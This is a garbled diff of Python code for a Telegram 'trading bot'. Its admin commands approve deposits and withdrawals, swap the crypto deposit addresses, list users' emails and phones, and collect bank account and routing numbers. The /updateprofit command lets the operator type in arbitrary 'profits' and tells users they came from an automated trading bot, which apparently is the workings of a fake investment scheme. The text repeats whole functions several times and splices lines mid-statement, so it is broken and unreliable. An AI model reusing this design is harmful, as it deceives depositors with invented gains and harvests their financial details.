+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
+                CallbackQueryHandler(handle_withdrawal, pattern='^withdraw:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
+                CallbackQueryHandler(withdraw_crypto_amount, pattern='^withdraw_crypto:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
+                CallbackQueryHandler(withdraw_bank_amount, pattern='^withdraw_bank:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
